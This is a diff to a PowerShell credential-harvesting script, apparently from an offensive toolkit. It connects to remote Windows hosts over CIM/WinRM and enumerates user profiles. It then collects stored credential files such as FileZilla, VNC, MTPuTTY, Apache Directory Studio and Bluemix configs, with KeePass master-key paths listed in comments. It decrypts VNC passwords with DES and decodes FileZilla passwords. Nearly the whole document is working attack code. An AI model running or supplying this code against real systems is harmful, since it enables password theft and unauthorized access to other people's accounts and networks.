@@ -14,14 +14,17 @@ function Get-CredentialFile {
 .PARAMETER ComputerName
     Specifies the target host.
 
-.PARAMETER Credential
-    Specifies the privileged account to use.
-
 .PARAMETER Ping
     Ensures host is up before run.
 
+.PARAMETER Credential
+    Specifies the privileged account to use.
+
+.PARAMETER Authentication
+    Specifies what authentication method should be used.
+
 .PARAMETER Protocol
-    Specifies the protocol to use.
+    Specifies the protocol to use, defaults to DCOM.
 
 .PARAMETER Download
     Enables file download.
@@ -36,13 +39,17 @@ function Get-CredentialFile {
         [String]
         $ComputerName = $env:COMPUTERNAME,
 
-        [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty,
-
         [Switch]
         $Ping,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
+        [String]
+        $Authentication = 'Default',
 
         [ValidateSet('Dcom', 'Wsman')]
         [String]
@@ -61,24 +68,44 @@ function Get-CredentialFile {
         $cimOption = New-CimSessionOption -Protocol $Protocol
         $psOption = New-PSSessionOption -NoMachineProfile
         try {
-            if ($Credential.Username) {
-                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+            if (-not $PSBoundParameters['ComputerName']) {
+                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                 if ($Download -and $Protocol -eq 'Wsman') {
-                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -SessionOption $psOption -ErrorAction Stop -Verbose:$false
+                    $psSession = New-PSSession -SessionOption $psOption -ErrorAction Stop -Verbose:$false
+                }
+            }
+            elseif ($Credential.Username) {
+                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+                if ($Download -and $Protocol -eq 'Wsman') {
+                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                 }
             }
             else {
-                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                 if ($Download -and $Protocol -eq 'Wsman') {
-                    $psSession = New-PSSession -ComputerName $ComputerName -SessionOption $psOption -ErrorAction Stop -Verbose:$false
+                    $psSession = New-PSSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                 }
             }
         }
-        catch [Microsoft.Management.Infrastructure.CimException] {
-            Write-Verbose "[$ComputerName] Failed to establish CIM session."
+        catch [System.Management.Automation.PSArgumentOutOfRangeException] {
+            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
             break
         }
-        catch [System.Management.Automation.Remoting.PSRemotingTransportException] {
+        catch [Microsoft.Management.Infrastructure.CimException] {
+            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
+                break
+            }
+            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                Write-Verbose "[$ComputerName] Access denied."
+                break
+            }
+            else {
+                Write-Verbose "[$ComputerName] Failed to establish CIM session."
+                break
+            }
+        }
+        catch [Management.Automation.Remoting.PSRemotingTransportException] {
             Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
             break
         }
@@ -107,8 +134,12 @@ function Get-CredentialFile {
             "Bluemix-Config"            = "\.bluemix\config.json"
             "Bluemix-Config2"           = "\.bluemix\.cf\config.json"
             # Sessions
-            "SuperPutty-Sessions"       = "\Documents\SuperPuTTY\Sessions.xml"
-            "MTPuTTy-Sessions"          = "\AppData\Roaming\TTYPlus\mtputty.xml"
+            "MTPuTTy"                   = "\AppData\Roaming\TTYPlus\mtputty.xml"
+            "ApacheDirectoryStudio"     = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
+            # Interesting files
+            #"RDCMan-Config"                 = "\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
+            #"KeePass-Config"                = "\AppData\Roaming\KeePass\KeePass.config.xml"
+            #"KeePass-MasterKey"             = "\AppData\Roaming\KeePass\ProtectedUserKey.bin"
         }
 
         Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
@@ -166,9 +197,9 @@ function Local:Get-VncCredentialFile {
         $PSSession,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
 
     BEGIN {
@@ -191,8 +222,8 @@ function Local:Get-VncCredentialFile {
                 )
             }
             $des = New-Object Security.Cryptography.DESCryptoServiceProvider
-            $des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-            $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
+            $des.Padding = [Security.Cryptography.PaddingMode]::Zeros
+            $des.Mode = [Security.Cryptography.CipherMode]::ECB
             return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
         }
 
@@ -240,7 +271,7 @@ function Local:Get-VncCredentialFile {
                     }
                     # Extract credentials from file
                     $creds = New-Object -TypeName psobject
-                    $reader = New-Object System.IO.StreamReader($outputFile)
+                    $reader = New-Object IO.StreamReader($outputFile)
                     while (($line = $reader.ReadLine()) -ne $null) {
                         if ($line.Contains("passwd=")) {
                             $pass = ($line.Split('=')[1]).Substring(0, 16)
@@ -282,9 +313,9 @@ function Local:Get-FilezillaCredentialFile {
         $PSSession,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
 
     BEGIN {
@@ -321,7 +352,7 @@ function Local:Get-FilezillaCredentialFile {
                         Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                     }
                     # Extract credentials from file
-                    $creds = New-Object System.Collections.ArrayList
+                    $creds = New-Object Collections.ArrayList
                     $xml = [Xml] (Get-Content $outputFile)
                     if (-not ($sessions = $xml.SelectNodes('//FileZilla3/Servers/Server')).Count) {
                         $sessions = $xml.SelectNodes('//FileZilla3/RecentServers/Server')
@@ -332,7 +363,7 @@ function Local:Get-FilezillaCredentialFile {
                             if ($_.InnerText) {
                                 if ($_.Name -eq "Pass") {
                                     if ($_.Attributes["encoding"].Value -eq "base64") {
-                                        $cred["Password"] = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($_.InnerText))
+                                        $cred["Password"] = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($_.InnerText))
                                     }
                                     else {
                                         $cred["Password"] = $_.InnerText
@@ -357,7 +388,6 @@ function Local:Get-FilezillaCredentialFile {
     END {}
 }
 
-
 function Local:Get-RemoteFile {
     [CmdletBinding()]
     Param (
@@ -378,9 +408,9 @@ function Local:Get-RemoteFile {
         $Protocol = 'SMB',
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty,
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
 
         [Management.Automation.Runspaces.PSSession]
         $PSSession
@@ -389,7 +419,7 @@ function Local:Get-RemoteFile {
     BEGIN {
         function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
             $stringBuilder = New-Object System.Text.StringBuilder 
-            [System.Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String)) | % { 
+            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
                 [Void]$stringBuilder.Append($_.ToString("x2")) 
             } 
             return $stringBuilder.ToString() 
